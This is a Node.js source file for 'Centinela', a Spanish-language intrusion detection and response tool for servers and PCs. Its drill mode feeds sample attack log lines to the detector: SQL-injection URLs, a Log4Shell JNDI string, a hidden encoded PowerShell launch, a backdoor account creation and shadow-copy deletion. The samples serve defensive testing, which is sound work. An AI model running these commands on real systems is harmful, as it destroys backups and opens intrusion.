#!/usr/bin/env node
'use strict';
// CENTINELA - deteccion y respuesta a ataques para servidores y PCs.
//
//   node centinela.js                      vigila este equipo (usa centinela.config.json)
//   node centinela.js --simulacro          simula ataques para ver como responde (no toca el firewall)
//   node centinela.js --analizar ARCHIVO   investiga un registro viejo (auth.log, access.log, pfirewall.log...)
//   node centinela.js --revisar-windows    investiga los eventos de Windows y Sysmon de las ultimas 24 h (--horas N)
//   node centinela.js --probar-avisos      manda un mensaje de prueba a Telegram/correo/Teams
//   node centinela.js --desbloquear IP     quita el bloqueo de una IP
//   node centinela.js --config RUTA        usa otro archivo de configuracion
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const http = require('http');

const { log, crearListaRedes, escribirJson, leerJson, normalizarIp } = require('./lib/util');
const { cargarReglas } = require('./lib/reglas');
const { Almacen } = require('./lib/almacen');
const { Motor, extraerFecha } = require('./lib/motor');
const { Respuesta } = require('./lib/respuesta');
const { investigar, informeTexto } = require('./lib/investigacion');
const { Avisos, mensajeCorto } = require('./lib/avisos');
const { iniciarRegistros, registrosPorDefecto } = require('./lib/detectores/registros');
const { DetectorWindows } = require('./lib/detectores/windows');
const { DetectorRed } = require('./lib/detectores/red');
const { DetectorArchivos } = require('./lib/detectores/archivos');
const { iniciarPanel } = require('./lib/panel');
const { Central, Agente } = require('./lib/central');

const VERSION = '1.0.0';

const PREDETERMINADA = () => ({
  equipo: os.hostname(),
  listaBlanca: ['127.0.0.1', '::1'],
  registros: null,
  reglasDesactivadas: [],
  ajustesReglas: {},
  respuesta: { bloquearAutomatico: true, terminarProcesos: true, simulacro: false, duraciones: [3600, 86400, 604800], cadenas: ['INPUT'], comandoEmergencia: null },
  investigacion: { dnsInverso: true, geolocalizar: false, abuseipdbClave: '' },
  avisos: { severidadMinima: 'media', maximoPorHora: 30, urlPanel: '', telegram: { token: '', chats: [] }, correo: {}, webhooks: [] },
  red: { activo: true, intervalo: 10, maxConexionesPorIp: 100, maxMediasAbiertasPorIp: 30 },
  archivos: { activo: true, criticos: null, carpetas: [], senuelos: true },
  windows: { activo: true },
  panel: { activo: true, puerto: 8095, direccion: '0.0.0.0', token: '', usuarios: [] },
  central: { esCentral: false, url: '', tokenAgentes: '', minutosSinReportar: 5 },
  datos: 'datos',
});

function mezclar(base, extra) {
  for (const [k, v] of Object.entries(extra || {})) {
    if (v && typeof v === 'object' && !Array.isArray(v) && base[k] && typeof base[k] === 'object' && !Array.isArray(base[k])) mezclar(base[k], v);
    else base[k] = v;
  }
  return base;
}

function cargarConfig(ruta) {
  const cfg = PREDETERMINADA();
  if (fs.existsSync(ruta)) {
    try { mezclar(cfg, JSON.parse(fs.readFileSync(ruta, 'utf8'))); } catch (e) { log('error', `${ruta} tiene un error: ${e.message}`); process.exit(1); }
  } else {
    // Primera vez: se crea la configuracion con un token aleatorio para el panel.
    const nueva = { equipo: cfg.equipo, listaBlanca: cfg.listaBlanca, panel: { puerto: 8095, token: crypto.randomBytes(18).toString('base64url') } };
    escribirJson(ruta, nueva);
    mezclar(cfg, nueva);
    log('info', `Se creo ${ruta}. Token del panel: ${nueva.panel.token}`);
    log('info', 'Revisa centinela.config.ejemplo.json para configurar avisos, lista blanca y carpetas.');
  }
  cfg.datos = path.resolve(path.dirname(ruta), cfg.datos);
  return cfg;
}

function argumento(nombre) {
  const i = process.argv.indexOf(nombre);
  return i >= 0 ? process.argv[i + 1] : undefined;
}

/** Arma todas las piezas. Lo usan el modo normal, el simulacro y las pruebas. */
function armar(cfg, { enMemoria = false } = {}) {
  const almacen = new Almacen(cfg.datos, { enMemoria });
  const listaBlanca = crearListaRedes(cfg.listaBlanca);
  const reglas = cargarReglas(cfg.reglasDesactivadas, cfg.ajustesReglas);
  const motor = new Motor({ reglas, almacen, host: cfg.equipo, listaBlanca });
  const respuesta = new Respuesta({ config: cfg.respuesta, almacen, listaBlanca });
  const avisos = new Avisos(cfg.avisos);
  const ctx = { almacen, motor, respuesta, avisos, host: cfg.equipo, version: VERSION, listaBlanca, reglas };
  if (cfg.central.esCentral) ctx.central = new Central({ almacen, avisos, respuesta, motor, config: cfg.central });
  if (!cfg.central.esCentral && cfg.central.url) ctx.agente = new Agente({ config: cfg.central, almacen, respuesta, avisos, host: cfg.equipo, version: VERSION });

  const terminar = async (inc, p) => {
    inc.procesosTerminados = inc.procesosTerminados || [];
    if (inc.procesosTerminados.includes(p.pid)) return;
    inc.procesosTerminados.push(p.pid);
    const r = await respuesta.terminarProceso(p.pid, p.imagen);
    if (!r) return;
    const nombre = String(p.imagen || '').split(/[\\/]/).pop();
    inc.acciones.push({
      fecha: new Date().toISOString(),
      texto: r.ok ? `Proceso ${p.pid} (${nombre}) terminado${respuesta.modo === 'simulacro' ? ' [simulacro]' : ''}` : `No se pudo terminar el proceso ${p.pid} (${nombre}): ${r.error}`,
    });
  };

  // Detectar -> detener -> investigar -> avisar
  motor.on('incidente', async (inc) => {
    log('alerta', `${inc.titulo}${inc.ip ? ` desde ${inc.ip}` : ''} [${inc.severidad}] (${inc.eventos} eventos)`);
    const fecha = () => new Date().toISOString();
    try {
      if (inc.ip && inc.bloquear && cfg.respuesta.bloquearAutomatico && !inc.enListaBlanca) {
        const b = await respuesta.bloquear(inc.ip, { motivo: inc.titulo, incidente: inc.id });
        if (!b.omitido) {
          const yaEstaba = b.incidentes[0] !== inc.id;
          const plazo = b.hasta ? `hasta ${b.hasta.replace('T', ' ').slice(0, 16)} UTC` : 'de forma permanente';
          inc.acciones.push({
            fecha: fecha(),
            texto: yaEstaba ? 'La IP ya estaba bloqueada' : `IP bloqueada en el firewall ${plazo}${respuesta.modo === 'simulacro' ? ' [simulacro]' : ''}${b.aplicado === false ? ` - FALLO al aplicar: ${b.error}` : ''}`,
          });
        }
      }
      if (inc.terminar && inc.procesos?.length) {
        for (const p of inc.procesos) await terminar(inc, p);
      }
      if (inc.emergencia) {
        const r = await respuesta.emergencia(inc);
        if (r) inc.acciones.push({ fecha: fecha(), texto: `Comando de emergencia ejecutado: ${r.ok ? 'ok' : r.error}` });
      }
      inc.investigacion = await investigar(inc, { almacen, config: cfg.investigacion });
    } catch (e) { log('error', `Respondiendo a ${inc.id}: ${e.message}`); }
    almacen.guardar();
    if (ctx.agente) ctx.agente.marcar(inc);
    else await avisos.incidente(inc, 'nuevo').catch((e) => log('error', e.message));
    motor.emit('listo', inc);
  });
  // Si el mismo ataque lanza procesos nuevos, tambien se cortan.
  motor.on('actualizado', async (inc, ev) => {
    if (inc.terminar && ev?.pid) { await terminar(inc, { pid: ev.pid, imagen: ev.imagen }); almacen.guardar(); }
    ctx.agente?.marcar(inc);
  });
  return ctx;
}

async function vigilar(rutaConfig) {
  const cfg = loadOrExit(rutaConfig);
  const ctx = armar(cfg);
  log('info', `Centinela ${VERSION} en "${cfg.equipo}" (${process.platform}) - modo ${ctx.respuesta.modo}${ctx.central ? ' - CENTRAL' : ''}${ctx.agente ? ' - AGENTE' : ''}`);
  if (!cfg.respuesta.simulacro && !(await require('./lib/detectores/windows').esAdministrador())) {
    log('aviso', process.platform === 'win32'
      ? 'Esta ventana NO es de administrador: no podra leer los eventos de seguridad ni bloquear IPs. Abre PowerShell con "Ejecutar como administrador".'
      : 'No se esta ejecutando como root: no podra leer algunos registros ni bloquear en el firewall.');
  }

  await ctx.respuesta.reaplicar();
  setInterval(() => ctx.respuesta.revisarVencidos(), 60 * 1000);

  const registros = cfg.registros || registrosPorDefecto();
  const escudoLog = path.join(cfg.datos, 'escudo.log');
  if (!cfg.registros && fs.existsSync(escudoLog)) registros.push({ ruta: escudoLog, tipo: 'web' });
  if (!registros.length) log('aviso', 'No se encontraron registros para vigilar. Agregalos en "registros" del archivo de configuracion.');
  iniciarRegistros(registros, ctx.motor);

  if (cfg.windows.activo) new DetectorWindows(ctx.motor).iniciar();
  if (cfg.red.activo) new DetectorRed(ctx.motor, cfg.red).iniciar();
  if (cfg.archivos.activo) {
    const a = { ...cfg.archivos };
    if (!a.criticos) delete a.criticos;
    new DetectorArchivos(ctx.motor, ctx.almacen, a).iniciar();
  }
  if (cfg.panel.activo) {
    if (!cfg.panel.token && !cfg.panel.usuarios?.length) log('aviso', 'El panel no tiene token: nadie podra entrar. Pon "panel.token" en la configuracion.');
    iniciarPanel({ config: cfg, ctx });
  }
  ctx.agente?.iniciar();

  const salir = () => { log('info', 'Centinela detenido.'); ctx.almacen.guardarYa(); process.exit(0); };
  process.on('SIGINT', salir);
  process.on('SIGTERM', salir);
}

function loadOrExit(ruta) { return cargarConfig(ruta); }

/** Adivina el tipo de registro mirando sus primeras lineas. */
function adivinarTipo(lineas) {
  const muestra = lineas.slice(0, 200).join('\n');
  if (/^#Fields:/m.test(muestra)) return 'iis';
  if (/ DROP (TCP|UDP) /.test(muestra)) return 'firewall-windows';
  if (/CENTINELA-SCAN|\[UFW BLOCK\]/.test(muestra)) return 'firewall-linux';
  if (/Log=\S+ RecordId=\d+ EventID=\d+|EventID=\d+/.test(muestra)) return 'windows';
  if (/sshd(-session)?\[\d+\]|sudo:|useradd\[/.test(muestra)) return 'ssh';
  if (/^\S+ \S+ \S+ \[[^\]]+\] "/m.test(muestra)) return 'web';
  return null;
}

async function analizar(rutaConfig, archivo) {
  const lineas = fs.readFileSync(archivo, 'utf8').replace(/^\uFEFF/, '').split(/\r?\n/).filter(Boolean);
  const tipo = argumento('--tipo') || adivinarTipo(lineas);
  if (!tipo) { console.error('No se reconoce el tipo de registro. Indica --tipo ssh|web|iis|windows|firewall-windows|firewall-linux'); process.exit(1); }
  return analizarLineas(rutaConfig, lineas, tipo, archivo);
}

/** Revisa los eventos de Windows (Seguridad, Defender y Sysmon) de las ultimas N horas. */
async function revisarWindows(rutaConfig) {
  if (process.platform !== 'win32') { console.error('--revisar-windows solo funciona en Windows. En otro sistema usa --analizar con un archivo.'); process.exit(1); }
  const horas = Number(argumento('--horas')) || 24;
  const { leerEventos, estadoRegistros, describirEstado, esAdministrador } = require('./lib/detectores/windows');
  if (!(await esAdministrador())) {
    console.log(AVISO_ADMIN);
    process.exit(1);
  }
  console.log(`Leyendo los eventos de las ultimas ${horas} horas (puede tardar un poco)...`);
  const salida = await leerEventos(horas * 3600, 512 * 1024 * 1024);
  console.log('\nREGISTROS DE WINDOWS');
  const estados = estadoRegistros(salida);
  if (!estados.length) console.log('  PowerShell no devolvio nada. Revisa que no lo bloquee el antivirus o una politica del equipo.');
  for (const e of estados) console.log(`  ${e.nombre.padEnd(42)} ${describirEstado(e)}`);
  const lineas = salida.split(/\r?\n/).filter((l) => / Log=\S+ RecordId=/.test(l)).reverse(); // Windows los da del mas nuevo al mas viejo
  const guardar = argumento('--guardar-eventos');
  if (guardar) { fs.writeFileSync(guardar, lineas.join('\n')); console.log(`Eventos guardados en ${guardar} (se pueden volver a analizar con --analizar).`); }
  return analizarLineas(rutaConfig, lineas, 'windows', `eventos de Windows (${horas} h)`);
}

const AVISO_ADMIN = `
Esta ventana de PowerShell NO es de administrador, y Windows no deja leer los registros de Seguridad ni de Sysmon sin ese permiso.
(Por eso tambien "net user ... /add" responde "Error de sistema 5. Acceso denegado".)

Como abrirla como administrador:
  1. Cierra esta ventana.
  2. Menu Inicio -> escribe "PowerShell" -> clic derecho en "Windows PowerShell" -> "Ejecutar como administrador" -> "Si".
  3. La ventana nueva dice "Administrador: Windows PowerShell" en el titulo.
  4. Vuelve a la carpeta y repite el comando:
       cd "${__dirname}"
       node centinela.js ${process.argv.slice(2).join(' ')}
`;

async function analizarLineas(rutaConfig, lineas, tipo, archivo) {
  const cfg = cargarConfig(rutaConfig);
  cfg.respuesta.simulacro = true;
  cfg.investigacion = { dnsInverso: false };
  log.silenciar();
  const ctx = armar(cfg, { enMemoria: true });
  ctx.avisos.incidente = async () => [];
  for (const l of lineas) {
    const t = extraerFecha(l);
    ctx.motor.procesarLinea(tipo, l, { archivo, fecha: Number.isFinite(t) ? t : undefined });
  }
  await new Promise((r) => setTimeout(r, 200));
  // En un analisis no se corta nada: se quitan las acciones simuladas para no confundir.
  for (const x of ctx.almacen.incidentes) x.acciones = [];
  const inc = ctx.almacen.incidentes;
  console.log(`\nANALISIS DE ${archivo}`);
  console.log(`Tipo: ${tipo} - ${lineas.length} lineas - ${ctx.motor.estadisticas.eventos} eventos sospechosos - ${inc.length} incidente(s)\n`);
  if (!inc.length) { console.log('No se encontraron ataques con las reglas actuales.'); return; }
  const porIp = new Map();
  for (const x of inc.filter((i) => i.ip)) { const e = porIp.get(x.ip) || { eventos: 0, reglas: new Set() }; e.eventos += x.eventos; e.reglas.add(x.titulo); porIp.set(x.ip, e); }
  if (porIp.size) {
    console.log('IPs ATACANTES (de mas a menos eventos)');
    [...porIp.entries()].sort((a, b) => b[1].eventos - a[1].eventos).slice(0, 30)
      .forEach(([ip, e]) => console.log(`  ${ip.padEnd(40)} ${String(e.eventos).padStart(6)} eventos  ${[...e.reglas].join(' | ')}`));
    console.log('');
  }
  console.log('INCIDENTES');
  for (const x of inc) {
    const quien = x.ip || (x.usuarios?.length ? `usuario: ${x.usuarios.slice(0, 3).join(', ')}` : `equipo: ${x.host}`);
    console.log(`  [${x.severidad.toUpperCase().padEnd(7)}] ${x.primerEvento.slice(0, 19).replace('T', ' ')}  ${x.titulo} (${x.eventos})`);
    console.log(`             ${quien}${x.detalle ? ` - ${x.detalle.slice(0, 160)}` : ''}`);
  }
  const destino = argumento('--informe');
  if (destino) {
    fs.writeFileSync(destino, inc.map(informeTexto).join(`\n\n${'='.repeat(70)}\n\n`));
    console.log(`\nInforme completo guardado en ${destino}`);
  } else console.log('\nPara el informe completo con evidencia: agrega --informe informe.txt');
}

/** Simula un ataque completo con IPs de documentacion (203.0.113.x, 198.51.100.x, 192.0.2.x). */
async function simulacro(rutaConfig) {
  const cfg = fs.existsSync(rutaConfig) ? cargarConfig(rutaConfig) : PREDETERMINADA();
  cfg.respuesta.simulacro = true;
  cfg.investigacion = { dnsInverso: false };
  cfg.central = { esCentral: false, url: '' };
  const ctx = armar(cfg, { enMemoria: true });
  const enviarDeVerdad = process.argv.includes('--enviar');
  if (!enviarDeVerdad) ctx.avisos.incidente = async (inc) => { console.log(`\n----- AVISO QUE RECIBIRIA TECNOLOGIA -----\n${mensajeCorto(inc, 'nuevo', cfg.avisos.urlPanel)}\n------------------------------------------`); return []; };
  const m = ctx.motor;
  const hoy = new Date();
  const syslog = () => `${hoy.toLocaleString('en-US', { month: 'short' })} ${String(hoy.getDate()).padStart(2)} ${hoy.toTimeString().slice(0, 8)} servidor sshd[1234]:`;
  const listos = [];
  m.on('listo', (i) => listos.push(i));

  console.log('\n1) Fuerza bruta SSH desde 203.0.113.50');
  for (const u of ['root', 'admin', 'root', 'oracle', 'root', 'ubuntu', 'root']) m.procesarLinea('ssh', `${syslog()} Failed password for ${u === 'root' ? '' : 'invalid user '}${u} from 203.0.113.50 port 4${Math.floor(Math.random() * 9999)} ssh2`);
  await esperar(100);
  console.log('\n2) La misma IP logra entrar (intrusion)');
  m.procesarLinea('ssh', `${syslog()} Accepted password for root from 203.0.113.50 port 50022 ssh2`);
  await esperar(100);
  console.log('\n3) Escaner web con sqlmap e inyeccion SQL desde 198.51.100.23');
  const fecha = `[${String(hoy.getDate()).padStart(2, '0')}/${hoy.toLocaleString('en-US', { month: 'short' })}/${hoy.getFullYear()}:${hoy.toTimeString().slice(0, 8)} -0400]`;
  for (const ruta of ['/.env', '/.git/config', '/wp-login.php', '/phpmyadmin/', '/productos?id=1%27%20OR%201=1--', '/productos?id=1%20UNION%20SELECT%20usuario,clave%20FROM%20usuarios--']) {
    m.procesarLinea('web', `198.51.100.23 - - ${fecha} "GET ${ruta} HTTP/1.1" 404 120 "-" "sqlmap/1.8"`);
  }
  await esperar(100);
  console.log('\n4) Intento de Log4Shell desde 198.51.100.99');
  m.procesarLinea('web', `198.51.100.99 - - ${fecha} "GET / HTTP/1.1" 200 512 "-" "\${jndi:ldap://198.51.100.99/a}"`);
  await esperar(100);
  console.log('\n5) Fuerza bruta a Escritorio Remoto de Windows desde 192.0.2.77');
  for (let i = 0; i < 9; i++) m.procesarLinea('windows', `Log=Security RecordId=${1000 + i} EventID=4625 IpAddress=192.0.2.77 TargetUserName=Administrador LogonType=10 SubjectUserName=-`);
  await esperar(100);
  console.log('\n6) Sysmon: un Word abre PowerShell oculto, crea el usuario "soporte" y borra las copias de seguridad');
  const ts = new Date().toISOString().slice(0, 19) + 'Z';
  const sysmon = (id, pid, img, padre, cmd) => `${ts} Log=Sysmon RecordId=${id} EventID=1 || User=OFICINA\\ana || ProcessId=${pid} || Image=${img} || ParentImage=${padre} || CommandLine=${cmd}`;
  const ps = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
  m.procesarLinea('windows', sysmon(501, 4410, ps, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', `"${ps}" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`));
  m.procesarLinea('windows', sysmon(502, 4420, 'C:\\Windows\\System32\\net.exe', ps, 'net user soporte P4ssw0rd! /add'));
  m.procesarLinea('windows', sysmon(503, 4430, 'C:\\Windows\\System32\\vssadmin.exe', ps, 'vssadmin.exe delete shadows /all /quiet'));
  await esperar(150);

  console.log('\n7) Ransomware tocando el archivo señuelo');
  m.registrar({ regla: 'ransomware-senuelo', clave: 'C:\\Compartida\\000_no_borrar_centinela.docx', detalle: 'El archivo señuelo C:\\Compartida\\000_no_borrar_centinela.docx fue modificado (cifrado?)' });
  await esperar(300);

  console.log('\n=============== RESUMEN DEL SIMULACRO ===============');
  for (const i of ctx.almacen.incidentes) console.log(`[${i.severidad.toUpperCase().padEnd(7)}] ${i.titulo}${i.ip ? ` - ${i.ip}` : ''} -> ${(i.acciones.map((a) => a.texto).join('; ') || 'solo aviso')}`);
  console.log('\nIPs bloqueadas (simulacro, no se toco el firewall):', ctx.almacen.bloqueos.map((b) => b.ip).join(', ') || 'ninguna');
  console.log(`\nInforme de investigacion del incidente mas grave:\n\n${informeTexto(ctx.almacen.incidentes.find((x) => x.severidad === 'critica') || ctx.almacen.incidentes[0])}`);
  if (!enviarDeVerdad) console.log('\n(Para mandar estos avisos de verdad a Telegram/correo/Teams: node centinela.js --simulacro --enviar)');
  process.exit(0);
}

const esperar = (ms) => new Promise((r) => setTimeout(r, ms));

async function probarAvisos(rutaConfig) {
  const cfg = cargarConfig(rutaConfig);
  const avisos = new Avisos(cfg.avisos);
  if (!avisos.canales.length) { console.log('No hay canales configurados en "avisos" (telegram, correo o webhooks).'); process.exit(1); }
  const r = await avisos.aTodos('[Centinela] Prueba de avisos', `Prueba de avisos desde ${cfg.equipo}. Si lees esto, el canal funciona.`);
  r.forEach((x) => console.log(`${x.ok ? 'OK   ' : 'FALLO'} ${x.canal}${x.error ? `: ${x.error}` : ''}`));
  process.exit(r.every((x) => x.ok) ? 0 : 1);
}

async function desbloquear(rutaConfig, ipCruda) {
  const ip = normalizarIp(ipCruda);
  if (!ip) { console.error('IP no valida'); process.exit(1); }
  const cfg = cargarConfig(rutaConfig);
  // Si Centinela esta corriendo, se le pide al panel (asi no se pisan los datos).
  const token = cfg.panel.token || cfg.panel.usuarios?.[0]?.token;
  const viaPanel = await new Promise((resolve) => {
    const req = http.request({ host: '127.0.0.1', port: cfg.panel.puerto, method: 'DELETE', path: `/api/bloqueos/${encodeURIComponent(ip)}`, headers: { Authorization: `Bearer ${token}` }, timeout: 3000 },
      (res) => { res.resume(); resolve(res.statusCode === 200); });
    req.on('error', () => resolve(false));
    req.end();
  });
  if (!viaPanel) {
    const ctx = armar(cfg);
    await ctx.respuesta.desbloquear(ip, 'linea de comandos');
    ctx.almacen.guardarYa();
  }
  console.log(`IP ${ip} desbloqueada.`);
  process.exit(0);
}

if (require.main === module) {
  const rutaConfig = path.resolve(argumento('--config') || path.join(__dirname, 'centinela.config.json'));
  const accion = process.argv.includes('--simulacro') ? simulacro(rutaConfig)
    : process.argv.includes('--analizar') ? analizar(rutaConfig, argumento('--analizar'))
      : process.argv.includes('--revisar-windows') ? revisarWindows(rutaConfig)
      : process.argv.includes('--probar-avisos') ? probarAvisos(rutaConfig)
        : process.argv.includes('--desbloquear') ? desbloquear(rutaConfig, argumento('--desbloquear'))
          : vigilar(rutaConfig);
  accion.catch((e) => { log('error', e.stack || e.message); process.exit(1); });
}

module.exports = { armar, cargarConfig, PREDETERMINADA, adivinarTipo, VERSION, leerJson };
